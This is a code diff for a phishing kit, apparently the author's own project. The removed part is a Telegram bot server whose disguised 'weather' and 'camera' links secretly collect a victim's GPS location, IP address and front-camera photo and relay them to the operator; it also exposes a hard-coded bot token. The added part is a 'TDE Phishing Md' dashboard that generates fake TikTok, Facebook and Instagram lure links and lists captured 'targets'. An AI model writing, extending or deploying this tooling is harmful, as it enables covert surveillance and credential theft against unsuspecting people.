@@ -1,119 +1,459 @@
-const express = require("express");
-const bodyParser = require("body-parser");
-const TelegramBot = require("node-telegram-bot-api");
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
 
-const app = express();
+<title>TDE Phishing Md</title>
 
-app.use(bodyParser.json({ limit: "10mb" }));
-app.use(express.static("public"));
+<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;600;800&display=swap" rel="stylesheet">
 
-// 🔐 CONFIG (put yours here)
-const TOKEN = "8653888099:AAE7kkVarBwcEdMQ7S1ZlrUoLyy9HP86TTU";
-const BASE_URL = "https://phishing-md.onrender.com";
+<style>
 
-// 🤖 BOT
-const bot = new TelegramBot(TOKEN, {
-  polling: {
-    autoStart: true,
-    interval: 1000
-  }
-});
+*{
+margin:0;
+padding:0;
+box-sizing:border-box;
+font-family:'Orbitron',sans-serif;
+}
 
-// 🟢 START
-bot.onText(/\/start/, (msg) => {
-  bot.sendMessage(msg.chat.id,
-`😌WELCOE TO TEMPLEDOMIC PHISHING BOT😌
-U CAN USE THIS TOOL TO GET INFO ABOUT YOUR VICTIM WITH JUST A LINK 🙂‍↔️
+body{
+background:#010409;
+color:#00ffee;
+overflow-x:hidden;
+}
 
-NOTE:THIIS BOT FOLLOW TERMS AND CONDITION OF TELEGRAM AND ANYTHING DISPLAYED HERE IS STRICTLY FOR EDUCATION PURPOSE ONLY ONLY 
+/* Background Glow */
 
-🌍 /weather - GET TARGET LOCATION
-📸 /camera - TAKE A SILENT IMAGE OF THIER FRONT CAMERA`
-  );
-});
+body::before{
+content:'';
+position:fixed;
+width:100%;
+height:100%;
+background:
+radial-gradient(circle at top,#00ffee22,transparent 40%),
+radial-gradient(circle at bottom,#00ff8822,transparent 40%);
+z-index:-1;
+}
 
-// 🌦️ WEATHER (MAIN FEATURE - PRIORITY)
-bot.onText(/\/weather/, (msg) => {
-  bot.sendMessage(msg.chat.id, "🌦️ Open Weather:", {
-    reply_markup: {
-      inline_keyboard: [[
-        {
-          text: "🌦️ Check Weather",
-          url: `${BASE_URL}/weather.html?chat=${msg.chat.id}`
-        }
-      ]]
-    }
-  });
-});
+/* Header */
 
-// 📸 CAMERA
-bot.onText(/\/camera/, (msg) => {
-  bot.sendMessage(msg.chat.id, "📸 Open Camera:", {
-    reply_markup: {
-      inline_keyboard: [[
-        {
-          text: "📸 Take Photo",
-          url: `${BASE_URL}/camera.html?chat=${msg.chat.id}`
-        }
-      ]]
-    }
-  });
-});
+header{
+padding:22px;
+text-align:center;
+font-size:30px;
+font-weight:800;
+letter-spacing:4px;
+background:#04131f;
+border-bottom:2px solid #00ffee55;
+box-shadow:0 0 25px #00ffee55;
+text-shadow:0 0 10px #00ffee;
+}
 
-// 📸 CAMERA RESULT
-app.post("/camera", (req, res) => {
-  try {
-    const { chatId, image } = req.body;
+/* Container */
 
-    if (!chatId || !image) return res.sendStatus(400);
+.container{
+padding:20px;
+}
 
-    const base64 = image.replace(/^data:image\/png;base64,/, "");
-    const buffer = Buffer.from(base64, "base64");
+/* Boxes */
 
-    bot.sendPhoto(chatId, buffer, {
-      caption: "📸 Photo received"
-    });
+.box{
+background:#07131d;
+border:1px solid #00ffee55;
+border-radius:20px;
+padding:20px;
+margin-bottom:20px;
+box-shadow:0 0 20px #00ffee22;
+}
 
-    res.json({ ok: true });
-  } catch (err) {
-    console.log("camera error:", err);
-    res.sendStatus(500);
-  }
-});
+.box h2{
+margin-bottom:15px;
+}
 
-// 🌦️ WEATHER RESULT (MAIN LOGIC)
-app.post("/weather", (req, res) => {
-  try {
-    const { chatId, lat, lon, weather } = req.body;
+/* Buttons */
 
-    if (!chatId) return res.sendStatus(400);
+.buttons{
+display:flex;
+gap:15px;
+flex-wrap:wrap;
+}
 
-    bot.sendMessage(chatId,
-`🌦️ WEATHER REPORT
+button{
+background:#021018;
+border:1px solid #00ffee;
+color:#00ffee;
+padding:14px 20px;
+border-radius:12px;
+font-size:14px;
+font-weight:bold;
+cursor:pointer;
+transition:0.3s;
+}
 
-📍 Location:
-Latitude: ${lat}
-Longitude: ${lon}
-🎯 IP Address 
-IP:${ip}
-🌡️ Temperature: ${weather?.temperature ?? "N/A"}°C
-💨 Wind Speed: ${weather?.windspeed ?? "N/A"} km/h`
-    );
+button:hover{
+background:#00ffee;
+color:#000;
+box-shadow:0 0 20px #00ffee;
+}
 
-    res.json({ ok: true });
-  } catch (err) {
-    console.log("weather error:", err);
-    res.sendStatus(500);
-  }
-});
+/* Link Box */
 
-// 🔥 KEEP ALIVE (helps Render)
-setInterval(() => {
-  console.log("bot alive");
-}, 30000);
+.link-box{
+background:#010b11;
+padding:15px;
+border-radius:12px;
+margin-top:15px;
+word-break:break-all;
+border:1px solid #00ffee44;
+}
 
-// 🚀 START SERVER
-const PORT = process.env.PORT || 3000;
-app.listen(PORT, () => {
-  console.log("🔥 Server running on port", PORT);
-});
+/* Stats */
+
+.stats{
+display:grid;
+grid-template-columns:repeat(auto-fit,minmax(160px,1fr));
+gap:15px;
+margin-top:15px;
+}
+
+.stat{
+background:#021018;
+padding:20px;
+border-radius:15px;
+border:1px solid #00ffee44;
+text-align:center;
+}
+
+.stat h1{
+font-size:30px;
+margin-bottom:8px;
+}
+
+.stat p{
+font-size:13px;
+color:#7fffe8;
+}
+
+/* Feed */
+
+.feed{
+height:350px;
+overflow-y:auto;
+background:#010b11;
+padding:15px;
+border-radius:15px;
+margin-top:15px;
+border:1px solid #00ffee44;
+}
+
+.feed-item{
+background:#07131d;
+padding:15px;
+border-radius:15px;
+margin-bottom:12px;
+border-left:4px solid #00ffee;
+}
+
+.feed-item h3{
+margin-bottom:10px;
+color:#00ffee;
+}
+
+.feed-item p{
+font-size:13px;
+margin-bottom:5px;
+color:#b7fff5;
+}
+
+/* Floating Admin Button */
+
+.admin-btn{
+position:fixed;
+bottom:20px;
+right:20px;
+width:70px;
+height:70px;
+border-radius:50%;
+background:#00ffee;
+color:#000;
+display:flex;
+justify-content:center;
+align-items:center;
+font-size:30px;
+font-weight:bold;
+cursor:pointer;
+box-shadow:0 0 30px #00ffee;
+transition:0.3s;
+z-index:999;
+}
+
+.admin-btn:hover{
+transform:scale(1.1);
+}
+
+/* Mobile */
+
+@media(max-width:600px){
+
+header{
+font-size:22px;
+}
+
+button{
+width:100%;
+}
+
+}
+
+</style>
+</head>
+
+<body>
+
+<header>
+TDE Phishing Md
+</header>
+
+<div class="container">
+
+<!-- SOCIAL LINKS -->
+
+<div class="box">
+
+<h2>🌐 Generate Social Links</h2>
+
+<div class="buttons">
+
+<button onclick="generateLink('tiktok')">
+TikTok Link
+</button>
+
+<button onclick="generateLink('facebook')">
+Facebook Link
+</button>
+
+<button onclick="generateLink('instagram')">
+Instagram Link
+</button>
+
+</div>
+
+<div class="link-box" id="linkBox">
+No link generated...
+</div>
+
+</div>
+
+<!-- DASHBOARD -->
+
+<div class="box">
+
+<h2>📊 Dashboard</h2>
+
+<div class="stats">
+
+<div class="stat">
+<h1 id="liveUsers">0</h1>
+<p>USERS ONLINE</p>
+</div>
+
+<div class="stat">
+<h1 id="feedbackCount">0</h1>
+<p>FEEDBACKS</p>
+</div>
+
+<div class="stat">
+<h1 id="uptime">72H</h1>
+<p>SERVER UPTIME</p>
+</div>
+
+</div>
+
+</div>
+
+<!-- LIVE FEED -->
+
+<div class="box">
+
+<h2>📡 Live Feed</h2>
+
+<div class="feed" id="feed">
+
+<p>Waiting for feedback...</p>
+
+</div>
+
+</div>
+
+</div>
+
+<!-- Floating Admin Button -->
+
+<div class="admin-btn" onclick="openAdmin()">
+☰
+</div>
+
+<script>
+
+/* =========================
+   LIVE USERS
+========================= */
+
+let users = 70;
+
+function updateUsers(){
+
+let change = Math.floor(Math.random()*20);
+
+if(Math.random() > 0.5){
+
+users += change;
+
+}else{
+
+users -= change;
+
+}
+
+if(users < 50){
+
+users = 50;
+
+}
+
+document.getElementById("liveUsers")
+.innerText = users.toLocaleString();
+
+}
+
+setInterval(updateUsers,2000);
+
+updateUsers();
+
+/* =========================
+   UPTIME
+========================= */
+
+let hours = 72;
+
+setInterval(()=>{
+
+hours++;
+
+document.getElementById("uptime")
+.innerText = hours + "H";
+
+},10000);
+
+/* =========================
+   GENERATE LINK
+========================= */
+
+let currentID = "";
+
+function generateLink(platform){
+
+currentID =
+Math.random().toString(36)
+.substring(2,8);
+
+let page = "";
+
+if(platform === "tiktok"){
+page = "tiktok.html";
+}
+
+if(platform === "facebook"){
+page = "facebook.html";
+}
+
+if(platform === "instagram"){
+page = "instagram.html";
+}
+
+let link =
+window.location.origin +
+"/" + page + "?id=" + currentID;
+
+document.getElementById("linkBox")
+.innerText = link;
+
+}
+
+/* =========================
+   LIVE FEED
+========================= */
+
+function checkFeed(){
+
+let feed =
+document.getElementById("feed");
+
+let feedbacks = 0;
+
+for(let i = 0; i < localStorage.length; i++){
+
+let key = localStorage.key(i);
+
+if(key.startsWith("userFeed_")){
+
+let data =
+JSON.parse(localStorage.getItem(key));
+
+feedbacks++;
+
+if(!document.getElementById(data.id)){
+
+let div =
+document.createElement("div");
+
+div.className = "feed-item";
+
+div.id = data.id;
+
+div.innerHTML = `
+
+<p>New Target Confirmed</p>
+
+<h3>🆔 ${data.id}</h3>
+
+<p><b>Platform:</b> ${data.platform}</p>
+
+<p><b>Name:</b> ${data.name}</p>
+
+<p><b>Note:</b> ${data.note}</p>
+
+<p><b>Time:</b> ${data.time}</p>
+
+`;
+
+feed.prepend(div);
+
+}
+
+}
+
+}
+
+document.getElementById("feedbackCount")
+.innerText = feedbacks;
+
+}
+
+setInterval(checkFeed,1000);
+
+/* =========================
+   OPEN ADMIN
+========================= */
+
+function openAdmin(){
+
+window.location.href = "admin.html";
+
+}
+
+</script>
+
+</body>
+</html>
